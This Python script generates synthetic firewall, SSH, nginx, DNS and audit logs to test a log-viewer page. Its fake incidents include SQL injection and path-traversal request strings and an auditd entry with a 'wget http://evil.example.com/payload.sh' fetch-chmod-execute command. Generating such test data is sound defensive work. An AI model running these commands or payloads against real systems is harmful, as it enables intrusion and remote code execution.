"""Generate three sample log files for /logs page testing.

Outputs (under apps/web/public/, so they're downloadable from the UI):
  - sample_small.log   ~50 lines     - mixed formats, manual review
  - sample_medium.log  ~500 lines    - realistic incident timeline
  - sample_large.log   ~5000 lines   - stress test for paginacion + filtros

Run:  python scripts/gen_sample_logs.py
"""
from __future__ import annotations

import random
import sys
from datetime import datetime, timedelta
from pathlib import Path

# Force UTF-8 stdout so the summary at the end prints correctly even on
# Windows consoles with cp1252 as the default code page.
try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

OUT_DIR = Path(__file__).resolve().parent.parent / "apps" / "web" / "public"

ATTACKER_IPS = ["91.234.56.78", "203.0.113.45", "185.220.101.7", "45.155.205.233"]
INTERNAL_IPS = ["10.0.0.5", "10.0.0.12", "10.0.1.15", "192.168.1.20", "192.168.1.50"]
EXTERNAL_OK = ["8.8.8.8", "1.1.1.1", "140.82.121.4", "151.101.1.69"]
USER_AGENTS = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'curl/7.81.0',
    'sqlmap/1.7.2',
    'python-requests/2.31.0',
]
USERS = ["alice", "bob", "carol", "root", "admin", "guest", "oracle"]
HOSTS = ["srv-01", "srv-02", "fw-edge", "web-01"]
MACS = ["aa:bb:cc:11:22:33", "00:1a:2b:3c:4d:5e", "08:00:27:de:ad:be", "ee:ff:00:11:22:33"]

random.seed(42)


def syslog_ts(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")


def iso_ts(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S+00:00")


def apache_ts(dt: datetime) -> str:
    return dt.strftime("[%d/%b/%Y:%H:%M:%S +0000]")


# ─── Generadores por categoría ────────────────────────────────────────────

def ssh_brute(dt: datetime, src: str, user: str, host: str = "srv-01") -> str:
    port = random.randint(40000, 65000)
    return (
        f"{syslog_ts(dt)} {host} sshd[{random.randint(1000, 9999)}]: "
        f"Failed password for {user} from {src} port {port} ssh2"
    )


def ssh_success(dt: datetime, src: str, user: str, host: str = "srv-01") -> str:
    port = random.randint(40000, 65000)
    return (
        f"{syslog_ts(dt)} {host} sshd[{random.randint(1000, 9999)}]: "
        f"Accepted password for {user} from {src} port {port} ssh2"
    )


def iptables_drop(dt: datetime, src: str, dst: str, dpt: int, proto: str = "TCP") -> str:
    spt = random.randint(1024, 65000)
    return (
        f"{syslog_ts(dt)} fw-edge kernel: [UFW BLOCK] IN=eth0 OUT= "
        f"MAC={random.choice(MACS)} SRC={src} DST={dst} LEN=60 TTL=64 "
        f"PROTO={proto} SPT={spt} DPT={dpt} WINDOW=29200"
    )


def iptables_accept(dt: datetime, src: str, dst: str, dpt: int) -> str:
    spt = random.randint(1024, 65000)
    return (
        f"{syslog_ts(dt)} fw-edge kernel: [UFW ALLOW] IN=eth0 OUT= "
        f"SRC={src} DST={dst} LEN=52 PROTO=TCP SPT={spt} DPT={dpt}"
    )


def nginx_log(dt: datetime, src: str, status: int, path: str = "/") -> str:
    ua = random.choice(USER_AGENTS)
    method = random.choice(["GET", "POST", "GET", "GET"])
    size = random.randint(120, 9000)
    return (
        f'{src} - - {apache_ts(dt)} "{method} {path} HTTP/1.1" '
        f'{status} {size} "-" "{ua}"'
    )


def dns_query(dt: datetime, src: str, qname: str) -> str:
    return (
        f"{iso_ts(dt)} dns-resolver dnsmasq[1234]: query[A] {qname} "
        f"from {src}"
    )


def arrow_flow(dt: datetime, src: str, dst: str, sport: int, dport: int, proto: str) -> str:
    return f"{iso_ts(dt)} netflow: {src}:{sport} -> {dst}:{dport} ({proto})"


def cron_benign(dt: datetime) -> str:
    return f"{syslog_ts(dt)} {random.choice(HOSTS)} CRON[{random.randint(1000,9999)}]: (root) CMD (/usr/local/bin/check_disk.sh)"


def systemd_benign(dt: datetime) -> str:
    msgs = [
        "Started Daily apt download activities.",
        "Reached target Multi-User System.",
        "Stopped Session 12 of user www-data.",
        "Reloading nginx configuration",
    ]
    return f"{syslog_ts(dt)} {random.choice(HOSTS)} systemd[1]: {random.choice(msgs)}"


def dhcp_lease(dt: datetime) -> str:
    return (
        f"{syslog_ts(dt)} fw-edge dhcpd: DHCPACK on {random.choice(INTERNAL_IPS)} "
        f"to {random.choice(MACS)} via eth0"
    )


def icmp_drop(dt: datetime, src: str, dst: str) -> str:
    return (
        f"{syslog_ts(dt)} fw-edge kernel: [UFW BLOCK] SRC={src} DST={dst} "
        f"PROTO=ICMP TYPE=8 CODE=0"
    )


def impossible_travel(dt: datetime) -> str:
    return (
        f"{iso_ts(dt)} auth-svc: User alice logged in successfully from "
        f"203.0.113.45 (Beijing, CN). Last known login: 2026-04-30 from "
        f"88.6.12.34 (Madrid, ES)."
    )


# ─── Composición ──────────────────────────────────────────────────────────

def small_log() -> str:
    """~50 líneas curadas a mano, una de cada tipo."""
    base = datetime(2026, 5, 3, 8, 0, 0)
    lines = []

    # Brute-force SSH burst
    for i in range(8):
        lines.append(ssh_brute(base + timedelta(seconds=i * 2), "91.234.56.78", "root"))
    lines.append(ssh_success(base + timedelta(seconds=20), "91.234.56.78", "oracle"))

    # iptables: drops + allows
    lines.append(iptables_drop(base + timedelta(minutes=1), "45.155.205.233", "10.0.0.5", 22))
    lines.append(iptables_drop(base + timedelta(minutes=1, seconds=5), "45.155.205.233", "10.0.0.5", 23))
    lines.append(iptables_drop(base + timedelta(minutes=1, seconds=10), "45.155.205.233", "10.0.0.5", 3389))
    lines.append(iptables_accept(base + timedelta(minutes=2), "10.0.0.12", "8.8.8.8", 53))

    # Nginx mix
    lines.append(nginx_log(base + timedelta(minutes=3), "203.0.113.45", 200, "/"))
    lines.append(nginx_log(base + timedelta(minutes=3, seconds=1), "203.0.113.45", 404, "/admin.php"))
    lines.append(nginx_log(base + timedelta(minutes=3, seconds=2), "203.0.113.45", 401, "/wp-login.php"))
    lines.append(nginx_log(base + timedelta(minutes=3, seconds=3), "203.0.113.45", 500, "/api/users?id=1' OR 1=1--"))
    lines.append(nginx_log(base + timedelta(minutes=3, seconds=4), "10.0.0.12", 200, "/dashboard"))

    # Arrow flow
    lines.append(arrow_flow(base + timedelta(minutes=4), "10.0.0.5", "151.101.1.69", 54321, 443, "TCP"))
    lines.append(arrow_flow(base + timedelta(minutes=4, seconds=10), "10.0.0.5", "8.8.8.8", 33445, 53, "UDP"))

    # DNS
    lines.append(dns_query(base + timedelta(minutes=5), "10.0.0.12", "github.com"))
    lines.append(dns_query(base + timedelta(minutes=5, seconds=1), "10.0.0.12", "evil.example.com"))

    # ICMP
    lines.append(icmp_drop(base + timedelta(minutes=6), "185.220.101.7", "10.0.0.5"))

    # DHCP / MAC
    lines.append(dhcp_lease(base + timedelta(minutes=7)))

    # Impossible travel
    lines.append(impossible_travel(base + timedelta(minutes=8)))

    # Benign noise
    lines.append(cron_benign(base + timedelta(minutes=9)))
    lines.append(systemd_benign(base + timedelta(minutes=9, seconds=10)))
    lines.append(systemd_benign(base + timedelta(minutes=10)))

    return "\n".join(lines) + "\n"


def medium_log() -> str:
    """~500 líneas, escenario realista de 2h con varios incidentes."""
    lines: list[str] = []
    base = datetime(2026, 5, 3, 8, 0, 0)
    cur = base

    def step(seconds_min: int = 1, seconds_max: int = 5) -> datetime:
        nonlocal cur
        cur += timedelta(seconds=random.randint(seconds_min, seconds_max))
        return cur

    # Bloque 1: tráfico benigno de fondo (50 líneas)
    for _ in range(50):
        choice = random.choice(["nginx_ok", "dns", "cron", "dhcp", "flow_ok", "systemd"])
        if choice == "nginx_ok":
            lines.append(nginx_log(step(), random.choice(INTERNAL_IPS), 200, random.choice(["/", "/api/health", "/static/main.css", "/dashboard"])))
        elif choice == "dns":
            lines.append(dns_query(step(), random.choice(INTERNAL_IPS), random.choice(["github.com", "google.com", "anthropic.com", "ubuntu.com"])))
        elif choice == "cron":
            lines.append(cron_benign(step(5, 30)))
        elif choice == "dhcp":
            lines.append(dhcp_lease(step()))
        elif choice == "flow_ok":
            lines.append(arrow_flow(step(), random.choice(INTERNAL_IPS), random.choice(EXTERNAL_OK), random.randint(40000, 65000), random.choice([443, 80, 53]), random.choice(["TCP", "UDP"])))
        else:
            lines.append(systemd_benign(step()))

    # Bloque 2: brute force SSH (80 líneas, ~5 min)
    attacker = "91.234.56.78"
    for i in range(80):
        if i % 12 == 11:
            lines.append(ssh_success(step(2, 4), attacker, "guest"))
        else:
            user = random.choice(["root", "admin", "oracle", "guest"])
            lines.append(ssh_brute(step(2, 4), attacker, user))

    # Bloque 3: port scan + drops iptables (70 líneas)
    scanner = "45.155.205.233"
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3306, 3389, 5432, 5900, 6379, 8080, 9200, 27017]
    for port in common_ports:
        lines.append(iptables_drop(step(0, 2), scanner, "10.0.0.5", port))
        lines.append(iptables_drop(step(0, 2), scanner, "10.0.0.12", port))
        lines.append(iptables_drop(step(0, 2), scanner, "192.168.1.20", port))
    lines.append(icmp_drop(step(), scanner, "10.0.0.5"))

    # Bloque 4: web attack (sql injection + path traversal) (60 líneas)
    web_attacker = "203.0.113.45"
    payloads = [
        "/admin.php", "/wp-login.php", "/.env", "/config.php",
        "/api/users?id=1' OR 1=1--",
        "/api/users?id=1; DROP TABLE users",
        "/../../../../etc/passwd",
        "/index.php?file=../../../../etc/shadow",
        "/shell.jsp", "/cgi-bin/test.cgi", "/.git/config",
    ]
    for _ in range(60):
        path = random.choice(payloads)
        status = random.choice([404, 404, 401, 403, 500, 200])
        lines.append(nginx_log(step(0, 3), web_attacker, status, path))

    # Bloque 5: exfiltración sospechosa (40 líneas)
    insider = "10.0.0.5"
    suspicious_dst = "185.220.101.7"  # Tor exit node
    for _ in range(40):
        lines.append(arrow_flow(step(1, 4), insider, suspicious_dst, random.randint(40000, 65000), random.choice([443, 9001, 9030]), "TCP"))

    # Bloque 6: impossible travel + privilege escalation (10 líneas)
    lines.append(impossible_travel(step(30, 60)))
    lines.append(f"{iso_ts(step())} sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash")
    lines.append(f"{iso_ts(step())} sudo: alice : COMMAND not allowed ; TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow")
    lines.append(f"{iso_ts(step())} auditd: USER_CMD pid=4521 uid=1001 cmd='wget http://evil.example.com/payload.sh'")
    lines.append(f"{iso_ts(step())} auditd: SYSCALL arch=c000003e syscall=execve success=yes exit=0 a0=7fff... comm=\"chmod\" exe=\"/usr/bin/chmod\"")
    for _ in range(6):
        lines.append(systemd_benign(step()))

    # Bloque 7: ruido de fondo final (resto hasta ~500)
    while len(lines) < 500:
        lines.append(systemd_benign(step(10, 60)))

    return "\n".join(lines[:500]) + "\n"


def large_log() -> str:
    """~5000 líneas, mucho ruido y varios incidentes mezclados.

    Diseñado para forzar el filtrado, la paginación y las reglas heurísticas.
    """
    lines: list[str] = []
    base = datetime(2026, 5, 1, 0, 0, 0)
    cur = base

    def step(s_min: int = 1, s_max: int = 30) -> datetime:
        nonlocal cur
        cur += timedelta(seconds=random.randint(s_min, s_max))
        return cur

    for _ in range(5000):
        roll = random.random()
        if roll < 0.45:  # 45% benigno
            r = random.choice(["nginx_ok", "dns", "cron", "dhcp", "systemd", "flow_ok"])
            if r == "nginx_ok":
                lines.append(nginx_log(step(), random.choice(INTERNAL_IPS), 200, random.choice(["/", "/api/health", "/dashboard", "/static/app.js"])))
            elif r == "dns":
                lines.append(dns_query(step(), random.choice(INTERNAL_IPS), random.choice(["github.com", "google.com", "ubuntu.com", "anthropic.com", "cloudflare.com"])))
            elif r == "cron":
                lines.append(cron_benign(step()))
            elif r == "dhcp":
                lines.append(dhcp_lease(step()))
            elif r == "flow_ok":
                lines.append(arrow_flow(step(), random.choice(INTERNAL_IPS), random.choice(EXTERNAL_OK), random.randint(40000, 65000), random.choice([443, 80, 53]), random.choice(["TCP", "UDP"])))
            else:
                lines.append(systemd_benign(step()))
        elif roll < 0.65:  # 20% brute force / ssh
            attacker = random.choice(ATTACKER_IPS)
            user = random.choice(USERS)
            if random.random() < 0.95:
                lines.append(ssh_brute(step(), attacker, user))
            else:
                lines.append(ssh_success(step(), attacker, user))
        elif roll < 0.80:  # 15% iptables drops (port scans)
            scanner = random.choice(ATTACKER_IPS)
            port = random.choice([21, 22, 23, 25, 80, 135, 139, 443, 445, 3306, 3389, 5432, 5900, 6379, 8080])
            target = random.choice(INTERNAL_IPS)
            lines.append(iptables_drop(step(), scanner, target, port))
        elif roll < 0.92:  # 12% web attacks
            attacker = random.choice(ATTACKER_IPS)
            path = random.choice([
                "/admin.php", "/wp-login.php", "/.env", "/.git/config",
                "/api/users?id=1' OR 1=1--",
                "/../../../../etc/passwd",
                "/shell.jsp", "/cgi-bin/test.cgi",
                "/api/login", "/api/v1/users",
            ])
            status = random.choice([404, 404, 404, 401, 403, 500, 200])
            lines.append(nginx_log(step(), attacker, status, path))
        elif roll < 0.97:  # 5% exfil / suspicious flows
            insider = random.choice(INTERNAL_IPS)
            dst = random.choice(["185.220.101.7", "45.155.205.233", "103.231.78.42"])
            lines.append(arrow_flow(step(), insider, dst, random.randint(40000, 65000), random.choice([443, 9001, 9030, 8080]), "TCP"))
        else:  # 3% ICMP/ARP/MAC ruido
            lines.append(icmp_drop(step(), random.choice(ATTACKER_IPS), random.choice(INTERNAL_IPS)))

    # Inyecta unos cuantos eventos críticos al final para que sean fáciles de buscar
    cur = datetime(2026, 5, 3, 23, 0, 0)
    lines.append(impossible_travel(step()))
    for i in range(20):
        lines.append(ssh_brute(step(1, 2), "91.234.56.78", "root"))
    lines.append(ssh_success(step(2, 5), "91.234.56.78", "oracle"))
    lines.append(f"{iso_ts(step())} auditd: USER_CMD pid=9912 uid=1001 cmd='wget http://evil.example.com/payload.sh -O /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh'")

    return "\n".join(lines) + "\n"


def main() -> None:
    OUT_DIR.mkdir(parents=True, exist_ok=True)

    files = [
        ("sample_small.log", small_log()),
        ("sample_medium.log", medium_log()),
        ("sample_large.log", large_log()),
    ]

    for name, content in files:
        path = OUT_DIR / name
        path.write_text(content, encoding="utf-8")
        n_lines = content.count("\n")
        size_kb = len(content) / 1024
        print(f"  - {path.name:22} {n_lines:>5} lines   {size_kb:>7.1f} KB")


if __name__ == "__main__":
    print(f"Escribiendo en {OUT_DIR}")
    main()
